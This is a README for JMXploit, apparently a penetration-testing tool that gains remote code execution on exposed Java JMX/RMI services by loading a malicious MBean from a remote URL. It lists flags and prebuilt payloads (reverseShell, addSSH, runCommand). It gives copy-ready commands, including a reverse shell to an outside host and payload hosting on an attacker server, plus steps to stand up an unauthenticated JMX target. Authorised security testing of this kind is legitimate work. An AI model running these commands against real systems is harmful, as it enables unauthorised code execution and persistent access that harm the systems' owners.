# JMXploit

## Overview: 
JMX (Java Management Extensions) is a framework used to manage Java applications. When running an application, you can attach JMX to it to see debug information, memory usage, and invoke management beans (MBeans). An MBean allows you to create and invoke functionality at runtime on a JMX-managed process. Oracle has some detailed documentation on this protocol and its uses here: https://docs.oracle.com/javase/tutorial/jmx/overview/index.html.

By default, JMX comes with a series of functionality that is used to manage the JMX configuration, including one which allows loading of arbitrary MBeans from a remote URL. This tool exploits this behavior by:
1. Connecting to the JMX installation
2. Enabling the management MBean 
3. Using the management MBean to load malicious Mbean (such as a reverse shell)
4. Invoking methods in the malicious Mbean
5. Uninstalling the malicious Mbean

This is not a new attack, but this tool was developed for portability and to allow for some custom functionality to make exploitation easier (such as extensibility and payload generation) 
### A detailed post by Mogwai Labs on exploiting JMX:
https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/


## Basic Usages
### Flags
```
 -h,--help                   Print the options and exit.
 -g <mbean>                  generates prebuilt mbean payload and exits
 -l                          lists all payloads and exits
 -rhost <ip>                 specifies the target host
 -rport <port>               sets the target port
 -p,--payload <mbean>        specifies a payload to generate and use
 -lhost <ip>                 the host to load the payload from
 -lport <port>               the port to load the payload from
 -noserver                   do not turn on internal file server
 -nou                        do not uninstall the payload after execution
 -u                          cleanup/uninstall mbean with config name
 -m,--method <method>        method to call (e.g. addSSH)
 -param,--params <[param]>   params to use, only Strings allowed
 -debug                      turn on compilation debugging
```
### Available default payloads (case insensitive)
```
addSSH
reverseShell
runCommand
enum
test
```

### Some common use cases
#### Simplest case
1. `JMXploit.jar -rhost 10.2.3.4 -rport 1099 -p runcommand`
2. This generates a payload such as the `runCommand` payload, loads it into the target, invokes the default method, and then unloads it
3. On most payloads the default method will just tell you the options you can use for that payload

#### Invoking a payload with parameters
1. `JMXploit.jar -rhost 10.2.3.4 -rport 1099 -p runcommand -method runCommand -params ls` 
2. Most payloads will list available methods for you along with their parameters if you invoke the default method
3. Parameters should be comma separated, without spaces between parameters
4. `JMXploit.jar -rhost 10.2.3.4 -rport 1099 -p reverseshell -method reverseShell -params 10.90.1.2,22`

#### To use a web server on a different machine than where you're launching from
1. Generate a payload kit with the `-g` flag, for example: `JMXploit.jar -g runcommand`
2. Copy the payload kit (the payload jar file and index.html in the `output` folder) to whatever server you want to use 
3. Run the tool using the lhost and lport flags to point to the correct server:
`JMXploit.jar -rhost 10.2.3.4 -rport 1099 -noserver -lhost 10.90.1.2 -lport 8080 -p runcommand -params ls`
   
#### Changing the MBean names
1. There is both a management MBean and a Malicious MBean loaded. By default these are loaded into the following locations: `java.util.logging:type=pineapple` and
`java.util.logging:type=pineappleTwo`
2. To edit these locations/names, modify the properties.conf file. You will need to use a properly formatted name and location, as well as escape characters appropriately.

## Building

To build JMXploit, run `./gradlew build`

If successful, the jar file should end up in `build/libs/JMXploit.jar`

## Debugging
### Standing up JMX locally for testing
#### Without auth:
```java -jar -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.port=1099 -Dcom.sun.management.jmxlocal.port=1099 -Dcom.sun.management.jmxremote.ssl=false <TEST_JAR.jar>```
In the above, the jar is the only think you'll need to change (assuming you want port 1099); just use any runnable jar that won't terminate immediately. 

#### With auth:
1. Kind of a nuisance to set up initially, make a password file and add a user to it such as `bob bobpassword`
2. Modify your access file, jmxremote.access, which may be at a path similar to `usr/lib/jvm/java-11-openjdk-amd64/conf/management/jmxremote.password` such as 
```# o The "monitorRole" role has readonly access.
#    The "controlRole" role has readwrite access and can create the standard
#   Timer and Monitor MBeans defined by the JMX API.`

monitorRole   readonly
bob	readonly
controlRole   readwrite \
              create javax.management.monitor.*,javax.management.timer.* \
              unregister
```
3. Now start JMX as below. You may need to restart it once or twice for it to use the cred file correctly
```sudo java -jar -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=7099 -Dcom.sun.management.jmxremote.password.file=/usr/lib/jvm/java-11-openjdk-amd64/conf/management/jmxremote.password -Dcom.sun.management.jmxlocal.port=7099 -Dcom.sun.management.jmxremote.ssl=false test.jar```
4. similar to above, test.jar is just any long-running executable jar file

### Built-in client
1. If you have java installed you can run the command `jconsole` to test your JMX instance using the built-in GUI. The tool comes with Java
2. When you invoke the tool, you can add the `-nou` flag to prevent uninstalling the payload. This works well with jconsole to give you a graphical interface to debug with

## Making a custom MBean
1. When the application is ran it will generate a 'payloads' directory. This is where the code for MBeans live. These payloads are dynamically compiled, so you can add Mbeans without modifying the core code
2. Drop the necessary classes in this directory, you will need an interface and a class with your code
3. In general, MBeans follow a naming convention. There is a chance it will not work if you do not follow that convention: https://docs.oracle.com/javase/tutorial/jmx/mbeans/standard.html. TLDR, you may need to name your interfaces with the suffix MBean.

### Common issues/errors

"The RMI service is unavailable at the target specified: 10.2.3.4:1099" - You likely don't have network connectivity to the specified server on that port. 

Long delay after "Attempting to load the payload from http://10.0.0.9:55963/index.html" followed by "javax.management.MBeanException: javax.management.ServiceNotFoundException: Problems while parsing URL [http://10.0.0.9:55963/index.html], got exception [java.net.ConnectException: Connection timed out]" - the server doesn't have network connectivity to load the remote payload from the specified URL. Try using the -lhost and -lport flags to load the payload from a custom location.